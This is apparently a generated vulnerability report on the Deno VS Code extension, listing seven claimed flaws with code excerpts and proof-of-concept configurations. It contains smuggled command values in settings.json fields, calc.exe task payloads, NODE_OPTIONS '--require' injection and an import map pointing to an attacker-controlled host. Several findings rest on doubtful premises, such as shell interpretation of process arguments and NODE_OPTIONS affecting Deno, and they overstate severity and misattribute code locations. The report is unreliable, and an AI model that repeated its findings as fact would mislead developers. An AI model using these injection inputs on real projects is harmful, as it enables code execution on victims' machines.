# Vulnerabilities in Deno VS Code Extension

## 1. Command Injection via Deno Tasks

### Description
The Deno VS Code extension allows running tasks defined in the `deno.json` configuration file. When a victim opens a malicious repository and runs a Deno task, arbitrary system commands embedded in the task definition can be executed on the victim's machine. This happens because the extension fetches task definitions from the Deno Language Server and executes them using `tasks.executeTask()` without adequate validation.

### Impact
Critical - An attacker can execute arbitrary system commands on the victim's machine with the same privileges as the VS Code process, potentially leading to complete system compromise.

### Currently Implemented Mitigations
The extension relies on the user to review task content before execution, but there are no technical controls preventing malicious commands from being executed.

### Missing Mitigations
- No sandboxing or restriction of commands that can be executed through Deno tasks
- No warning or confirmation dialog showing the actual command to be executed
- No validation of task command content against a whitelist of safe operations

### Preconditions
- Victim must open a malicious repository with a crafted `deno.json` file
- Victim must trigger a task execution (by clicking "Run Task" in the Tasks sidebar or through the command palette)
- Deno extension must be enabled for the workspace

### Source Code Analysis
Here's how the vulnerability can be triggered:

1. In `tasks_sidebar.ts`, the `#runTask` method directly executes tasks:
```typescript
#runTask(task: DenoTask) {
  tasks.executeTask(task.task);
}
```

2. Tasks are built from the repository's deno.json in the `DenoTaskProvider`:
```typescript
const task = buildDenoConfigTask(
  workspaceFolder,
  process,
  configTask.name,
  configTask.command ?? configTask.detail,
  Uri.parse(configTask.sourceUri),
);
```

3. The `buildDenoConfigTask` function in `tasks.ts` creates a `ProcessExecution` object that will execute the command:
```typescript
const task = new vscode.Task(
  {
    type: TASK_TYPE,
    name: name,
    command: "task",
    args,
    sourceUri,
  },
  scope,
  name,
  TASK_SOURCE,
  new vscode.ProcessExecution(process, ["task", ...args]),
  ["$deno"],
);
```

4. When the task is executed, it runs `deno task [name]`, where the actual command executed is determined by the task definition in the deno.json file.

### Security Test Case
1. Create a malicious repository with a `deno.json` file containing:
```json
{
  "tasks": {
    "malicious": "echo 'Malicious command executed' && calc.exe"
  }
}
```

2. Open the repository in VS Code with the Deno extension installed
3. Open the Deno Tasks sidebar
4. Click on the "malicious" task
5. Observe that calculator application is launched, demonstrating arbitrary command execution

## 2. Remote Code Execution via Debug Configuration

### Description
When a victim debugs a JavaScript/TypeScript file with the Deno extension, the extension automatically creates a debug configuration with the `--allow-all` flag if no configuration exists. This flag grants the executed code full permissions to access the file system, network, and execute system commands without any restrictions or user confirmation.

### Impact
Critical - Malicious code can access sensitive files, exfiltrate data, or execute arbitrary commands on the victim's system with the same privileges as the VS Code process.

### Currently Implemented Mitigations
None - The extension automatically configures debugging with full permissions.

### Missing Mitigations
- No permission prompt or warning before applying `--allow-all` permissions
- No default minimal permission set (least privilege approach)
- No option to run in a restricted sandbox first

### Preconditions
- Victim must open a malicious JavaScript/TypeScript file
- Victim must start debugging the file (F5 or "Start Debugging" command)
- Deno extension must be enabled

### Source Code Analysis
In `debug_config_provider.ts`, the `resolveDebugConfiguration` method automatically creates a configuration with `--allow-all` when none exists:

```typescript
async resolveDebugConfiguration(
  workspace: vscode.WorkspaceFolder | undefined,
  config: vscode.DebugConfiguration,
): Promise<vscode.DebugConfiguration | null | undefined> {
  // if launch.json is missing or empty
  if (!config.type && !config.request && !config.name) {
    const editor = vscode.window.activeTextEditor;
    const langId = editor?.document.languageId;
    if (
      editor &&
      (langId === "typescript" || langId === "javascript" ||
        langId === "typescriptreact" || langId === "javascriptreact")
    ) {
      // ...
      const debugConfig: vscode.DebugConfiguration = {
        request: "launch",
        name: "Launch Program",
        type: "node",
        program: "${file}",
        env: this.#getEnv(),
        runtimeExecutable: await getDenoCommandName(),
        runtimeArgs: [
          "run",
          ...this.#getAdditionalRuntimeArgs(),
          this.#getInspectArg(),
          "--allow-all", // Grants full permissions to code being debugged
        ],
        attachSimplePort: 9229,
      };

      // Immediately starts debugging with this configuration
      vscode.debug.startDebugging(workspace, debugConfig);
      return undefined;
    }
    return null;
  }
  // ...
}
```

The key issue is the automatic inclusion of the `--allow-all` flag which grants the code full access to system resources without requiring any user confirmation. When combined with automatically starting the debugging session, this creates a path for immediate code execution with elevated privileges.

### Security Test Case
1. Create a malicious TypeScript file (evil.ts) with the following content:
```typescript
// This will execute calc.exe on Windows or open calculator on macOS
// In a real attack, this could exfiltrate data, install malware, etc.
if (Deno.build.os === "windows") {
  const p = Deno.run({cmd: ["calc.exe"]});
  await p.status();
} else if (Deno.build.os === "darwin") {
  const p = Deno.run({cmd: ["open", "-a", "Calculator"]});
  await p.status();
} else {
  const p = Deno.run({cmd: ["xdg-open", "https://example.com"]});
  await p.status();
}

console.log("Malicious code executed with full permissions!");
```

2. Open this file in VS Code with the Deno extension enabled
3. Press F5 or click the debug button to start debugging
4. Observe that the calculator application opens, demonstrating successful arbitrary code execution
5. The code has full access to the file system, network, and can run arbitrary system commands

## 3. Command Injection through deno.path setting

### Description
The extension allows users to configure the path to the Deno executable through the `deno.path` setting. When a workspace is opened, this setting is read from workspace settings (`.vscode/settings.json`) and used to execute the Deno language server. A malicious repository could include a `.vscode/settings.json` file with a `deno.path` value containing command injection characters.

Step by step exploitation:
1. Attacker creates a repository with a `.vscode/settings.json` file containing:
   ```json
   {
     "deno.path": "malicious_command & deno"
   }
   ```
2. When a victim with the Deno extension opens this repository and trusts it
3. The extension reads the `deno.path` setting from workspace settings
4. The extension uses this value to start the Deno language server
5. The command `malicious_command & deno lsp` is executed, running the attacker's code

### Impact
The attacker can execute arbitrary commands with the privileges of the VSCode process on the victim's machine. This could lead to data theft, installation of malware, or complete system compromise.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
VSCode has a workspace trust model that prevents certain settings like executable paths from being applied in untrusted workspaces. However, once a user trusts a workspace, these settings are applied.

### Missing Mitigations
The extension should validate and sanitize the `deno.path` setting to ensure it doesn't contain shell metacharacters. Additionally, it should warn users when they are about to use a non-standard Deno executable path from workspace settings.

### Preconditions
- Victim must have the Deno extension installed
- Victim must open the malicious repository in VSCode
- Victim must trust the workspace when prompted by VSCode

### Source Code Analysis
The vulnerability exists in several files:

In `client/src/util.ts`, the extension gets the Deno command path from workspace settings:
```typescript
function getWorkspaceConfigDenoExePath() {
  const exePath = workspace.getConfiguration(EXTENSION_NS)
    .get<string>("path");
  // it is possible for the path to be blank. In that case, return undefined
  if (typeof exePath === "string" && exePath.trim().length === 0) {
    return undefined;
  } else {
    return exePath;
  }
}
```

In `client/src/commands.ts`, this path is used to create server options for the language client:
```typescript
const serverOptions: ServerOptions = {
  run: {
    command,
    args: ["lsp"],
    options: { env },
  },
  debug: {
    command,
    args: ["lsp"],
    options: { env },
  },
};
```

The `command` variable comes from `getDenoCommandPath()`, which ultimately returns the value from workspace settings. This value is passed directly to the `vscode-languageclient` library, which uses Node.js's `child_process` module to execute the command. If the command contains shell metacharacters, it could lead to command injection.

### Security Test Case
1. Create a test repository with a `.vscode/settings.json` file containing:
   ```json
   {
     "deno.path": "echo 'Command Injection Successful' > /tmp/vscode_deno_vulnerability && which deno"
   }
   ```
2. Install the Deno extension in VSCode
3. Open the test repository in VSCode
4. When prompted, trust the workspace
5. The extension will execute the command when starting the language server
6. Verify that a file `/tmp/vscode_deno_vulnerability` was created with the text "Command Injection Successful"

## 4. Command Injection through deno.env and deno.envFile settings

### Description
The extension allows setting environment variables for the Deno language server through the `deno.env` and `deno.envFile` settings. These environment variables are applied when executing Deno commands. A malicious repository could include environment variables that influence how commands are executed, potentially leading to command injection.

Step by step exploitation:
1. Attacker creates a repository with a `.vscode/settings.json` file containing:
   ```json
   {
     "deno.env": {
       "NODE_OPTIONS": "--require /tmp/malicious.js"
     }
   }
   ```
   Or includes a malicious `.env` file and sets:
   ```json
   {
     "deno.envFile": "path/to/malicious.env"
   }
   ```
2. When a victim opens this repository and trusts it
3. The extension reads these settings and applies them when executing Deno commands
4. The attacker's environment variables could influence how Node.js executes commands, potentially executing malicious code

### Impact
The attacker can potentially execute arbitrary code through environment variables that influence command execution. This could lead to data theft, installation of malware, or system compromise.

### Vulnerability Rank
High

### Currently Implemented Mitigations
VSCode's workspace trust model provides some protection, requiring users to explicitly trust a workspace before these settings are applied.

### Missing Mitigations
The extension should validate environment variables to ensure they don't contain potentially dangerous values. It should also warn users when environment variables from workspace settings might influence code execution.

### Preconditions
- Victim must have the Deno extension installed
- Victim must open the malicious repository in VSCode
- Victim must trust the workspace when prompted
- The specific environment variables must be able to influence code execution in the Deno language server process

### Source Code Analysis
In `client/src/commands.ts`, the extension reads environment variables from workspace settings:
```typescript
const denoEnvFile = config.get<string>("envFile");
if (denoEnvFile) {
  if (workspaceFolder) {
    const denoEnvPath = path.join(workspaceFolder.uri.fsPath, denoEnvFile);
    try {
      const content = fs.readFileSync(denoEnvPath, { encoding: "utf8" });
      const parsed = dotenv.parse(content);
      Object.assign(env, parsed);
    } catch (error) {
      vscode.window.showErrorMessage(
        `Could not read env file "${denoEnvPath}": ${error}`,
      );
    }
  }
}
const denoEnv = config.get<Record<string, string>>("env");
if (denoEnv) {
  Object.assign(env, denoEnv);
}
```

These environment variables are then used when executing the Deno language server:
```typescript
const serverOptions: ServerOptions = {
  run: {
    command,
    args: ["lsp"],
    options: { env },
  },
  debug: {
    command,
    args: ["lsp"],
    options: { env },
  },
};
```

Environment variables like `NODE_OPTIONS` could be used to execute arbitrary code when Node.js starts. There's no validation or sanitization of these environment variables.

### Security Test Case
1. Create a test repository with a `.vscode/settings.json` file containing:
   ```json
   {
     "deno.env": {
       "NODE_OPTIONS": "--require /tmp/malicious.js"
     }
   }
   ```
2. Create a file at `/tmp/malicious.js` with:
   ```javascript
   require('fs').writeFileSync('/tmp/env_injection_successful', 'Environment Variable Command Injection Test');
   ```
3. Install the Deno extension in VSCode
4. Open the test repository in VSCode and trust it
5. The extension will apply the environment variables when starting the language server
6. Verify that a file `/tmp/env_injection_successful` was created with the test message

## 5. Path Traversal Leading to Command Injection via Environment File Configuration

### Description
The VSCode Deno extension has a path traversal vulnerability in how it handles the `deno.envFile` setting. When executing commands, the extension reads an environment file path from the configuration, joins it with the workspace path without proper validation, reads its contents, and adds the parsed variables to the environment of executed Deno processes.

Step by step exploitation:
1. Attacker creates a malicious repository with a `.vscode/settings.json` file containing a crafted `deno.envFile` setting with path traversal sequences
2. When victim opens this repository in VSCode, the extension reads this setting
3. The extension constructs a file path using `path.join(workspaceFolder.uri.fsPath, denoEnvFile)` without validating that the resulting path remains within the workspace
4. The extension reads the file content, parses it as environment variables, and applies these to Deno command executions
5. By controlling environment variables, an attacker can inject commands that will be executed when a Deno task is run

### Impact
This vulnerability allows an attacker to achieve remote code execution on the victim's machine. By manipulating environment variables, the attacker can control command execution flow and execute arbitrary commands when the victim runs Deno tasks or tests.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
There are no mitigations currently implemented. The code does not validate that the resulting file path is within the workspace directory, nor does it sanitize the environment variables read from the file.

### Missing Mitigations
1. The extension should validate that the constructed file path is within the workspace directory
2. The extension should sanitize environment variables to prevent command injection
3. The extension should implement a whitelist of allowed environment variable names

### Preconditions
1. Victim must have the VSCode Deno extension installed
2. Victim must open a malicious repository in VSCode
3. Victim must trigger a Deno task or command that uses the environment variables

### Source Code Analysis
The vulnerability exists in multiple files:

In `commands.ts`:
```javascript
const env = {} as Record<string, string>;
const denoEnvFile = config.get<string>("envFile");
if (denoEnvFile) {
  if (workspaceFolder) {
    const denoEnvPath = path.join(workspaceFolder.uri.fsPath, denoEnvFile);
    try {
      const content = fs.readFileSync(denoEnvPath, { encoding: "utf8" });
      const parsed = dotenv.parse(content);
      Object.assign(env, parsed);
    } catch (error) {
      vscode.window.showErrorMessage(
        `Could not read env file "${denoEnvPath}": ${error}`,
      );
    }
  }
}
```

Similarly in `upgrade.ts`:
```javascript
const denoEnvFile = config.get<string>("envFile");
if (denoEnvFile) {
  if (workspaceFolder) {
    const denoEnvPath = join(workspaceFolder.uri.fsPath, denoEnvFile);
    try {
      const content = readFileSync(denoEnvPath, { encoding: "utf8" });
      const parsed = dotenv.parse(content);
      Object.assign(env, parsed);
    } catch (error) {
      vscode.window.showErrorMessage(
        `Could not read env file "${denoEnvPath}": ${error}`,
      );
    }
  }
}
```

There's no validation that the constructed path stays within the workspace boundaries. If `denoEnvFile` is something like `../../../malicious/env`, it will read a file outside the workspace.

The critical part is what happens with these environment variables. They're passed directly to the Deno process:
```javascript
const exec = new vscode.ProcessExecution(
  process,
  args,
  { env: env },
);
```

By controlling environment variables, an attacker can inject malicious commands or modify the execution flow of legitimate commands.

### Security Test Case
To verify this vulnerability:

1. Create a malicious repository with the following structure:
   - `.vscode/settings.json`:
     ```json
     {
       "deno.enable": true,
       "deno.envFile": "../../../tmp/malicious_env"
     }
     ```

2. Create a malicious environment file at `/tmp/malicious_env` with:
   ```
   NODE_OPTIONS=--require=/tmp/malicious.js
   ```

3. Create `/tmp/malicious.js` with code to execute:
   ```javascript
   require('child_process').exec('calc.exe'); // For Windows demo
   ```

4. Have the victim:
   - Clone the malicious repository
   - Open it in VSCode with the Deno extension installed
   - Trigger any Deno task (e.g., using the "Deno: Run" command or clicking a test code lens)

5. When the task runs, the Deno process will inherit the malicious environment variables, which will cause arbitrary code execution via the NODE_OPTIONS environment variable.

## 6. Code Injection through Import Maps

### Description
The Deno extension allows specifying an import map through the `deno.importMap` setting. Import maps provide a way to redirect module specifiers, which could be exploited to load malicious code. When executing Deno commands, the extension passes the import map to Deno, which could lead to execution of malicious code.

Step by step exploitation:
1. Attacker creates a repository with a `.vscode/settings.json` file containing:
   ```json
   {
     "deno.importMap": "path/to/malicious-import-map.json"
   }
   ```
2. The malicious import map redirects trusted imports to malicious code:
   ```json
   {
     "imports": {
       "trusted-module": "https://malicious-site.com/malicious-code.js"
     }
   }
   ```
3. When a victim opens this repository and trusts it
4. The victim runs a Deno command through the extension, which uses the import map
5. Imports of "trusted-module" are redirected to the attacker's malicious code
6. The malicious code is executed with the permissions granted to the Deno process

### Impact
The attacker can execute arbitrary code within the Deno runtime when the victim runs Deno commands. This could lead to accessing files, network resources, or executing system commands if the Deno process has the necessary permissions.

### Vulnerability Rank
High

### Currently Implemented Mitigations
VSCode's workspace trust model provides some protection. Additionally, Deno's security model requires explicit permissions for accessing sensitive resources, limiting the impact somewhat.

### Missing Mitigations
The extension should validate import maps to ensure they don't redirect to untrusted sources. It should also warn users when an import map from workspace settings is being used.

### Preconditions
- Victim must have the Deno extension installed
- Victim must open the malicious repository in VSCode
- Victim must trust the workspace when prompted
- Victim must run a Deno command that uses the import map and imports the redirected module
- The Deno command must be run with sufficient permissions for the malicious code to be effective

### Source Code Analysis
In `client/src/debug_config_provider.ts`, the extension adds the import map to Deno command arguments:
```typescript
#getAdditionalRuntimeArgs() {
  const args: string[] = [];
  const settings = this.#extensionContext.clientOptions
    .initializationOptions();
  if (settings.unstable) {
    args.push("--unstable");
  }
  if (settings.importMap) {
    args.push("--import-map");
    args.push(settings.importMap.trim());
  }
  if (settings.config) {
    args.push("--config");
    args.push(settings.config.trim());
  }
  return args;
}
```

In `client/src/commands.ts`, the import map is also used for test commands:
```typescript
if (!testArgs.includes("--import-map")) {
  const importMap: string | undefined | null = config.get("importMap");
  if (importMap?.trim()) {
    testArgs.push("--import-map", importMap.trim());
  }
}
```

The import map is read from workspace settings without validation, and if it redirects trusted modules to malicious sources, it could lead to execution of malicious code.

### Security Test Case
1. Create a test repository with:
   - A `.vscode/settings.json` file:
     ```json
     {
       "deno.enable": true,
       "deno.importMap": "./import-map.json"
     }
     ```
   - An `import-map.json` file:
     ```json
     {
       "imports": {
         "std/": "https://attacker-controlled-domain.com/fake-std/"
       }
     }
     ```
   - A Deno test file `test.ts`:
     ```typescript
     import { writeFileSync } from "std/fs/mod.ts";

     Deno.test("Import Map Injection Test", () => {
       writeFileSync("/tmp/import_map_injection_successful", "Import Map Code Injection Test");
     });
     ```
2. Set up a server at `attacker-controlled-domain.com` that serves a malicious `fake-std/fs/mod.ts` file
3. Install the Deno extension in VSCode
4. Open the test repository in VSCode and trust it
5. Run the test using the Deno extension's test code lens
6. Verify that when the test imports from "std/", it gets the attacker's malicious code instead, which creates the test file

## 7. Command Injection via Import Map Path

### Description
The Deno extension allows specifying a custom import map via the `deno.importMap` setting. When executing Deno commands (like running tests or tasks), the extension uses this setting to build the command line arguments without proper validation or sanitization. Since the path is used directly in command arguments, an attacker can craft a malicious import map path that contains shell metacharacters to inject additional commands.

Step by step exploitation process:
1. Attacker creates a repository with a `.vscode/settings.json` file containing a malicious import map path:
   ```json
   {
     "deno.enable": true,
     "deno.importMap": "legitimate.json; touch /tmp/pwned #"
   }
   ```
2. When the victim runs a Deno test or task through the extension, the malicious path is passed directly to the command line

### Impact
This vulnerability allows arbitrary command execution on the victim's machine with the same privileges as VSCode. While this requires slightly more user interaction than the previous vulnerability (the user must run a test or task), it's still a critical issue as running tests is a common developer workflow.

### Vulnerability Rank
High

### Currently Implemented Mitigations
None. The import map setting is directly added to command line arguments:

```typescript
if (settings.importMap) {
  args.push("--import-map");
  args.push(settings.importMap.trim());
}
```

### Missing Mitigations
1. The extension should validate that the import map path does not contain shell metacharacters
2. It should use proper argument escaping when building command lines
3. Alternatively, it could use APIs that don't involve shell interpretation for executing processes

### Preconditions
1. The victim must have the Deno VSCode extension installed
2. The victim must open a repository containing the malicious configuration
3. The victim must run a Deno test, task, or other command that uses the import map setting

### Source Code Analysis
In several places throughout the codebase, command arguments are built using the import map setting without proper escaping:

1. In `commands.ts`, the `#getAdditionalRuntimeArgs()` method in the `DenoDebugConfigurationProvider` class:
```typescript
#getAdditionalRuntimeArgs() {
  const args: string[] = [];
  const settings = this.#extensionContext.clientOptions.initializationOptions();
  if (settings.unstable) {
    args.push("--unstable");
  }
  if (settings.importMap) {
    args.push("--import-map");
    args.push(settings.importMap.trim());
  }
  // ...
  return args;
}
```

2. In the `test` function in `commands.ts`:
```typescript
if (!testArgs.includes("--import-map")) {
  const importMap: string | undefined | null = config.get("importMap");
  if (importMap?.trim()) {
    testArgs.push("--import-map", importMap.trim());
  }
}
```

3. These arguments are then passed to `ProcessExecution` to create and run tasks:
```typescript
const task = tasks.buildDenoTask(
  workspaceFolder,
  denoCommand,
  definition,
  `test "${name}"`,
  args,
  ["$deno-test"],
);
```

The vulnerability exists because the import map path is not validated or sanitized before being used in command arguments, potentially allowing command injection.

### Security Test Case
To demonstrate this vulnerability:

1. Create a repository with a `.vscode/settings.json` file:
   ```json
   {
     "deno.enable": true,
     "deno.importMap": "legitimate.json; touch /tmp/cmd-injected #"
   }
   ```

2. Create a simple Deno test file in the repository:
   ```typescript
   // test.ts
   Deno.test("Simple test", () => {
     console.log("Running test");
   });
   ```

3. When the victim opens this repository in VSCode with the Deno extension installed and runs the test (either via code lens or command palette), the injected command will execute

4. Verify that the `/tmp/cmd-injected` file was created, indicating successful command injection

This vulnerability requires the user to run a Deno command, but it's still dangerous as running tests is a common action when working with repositories.
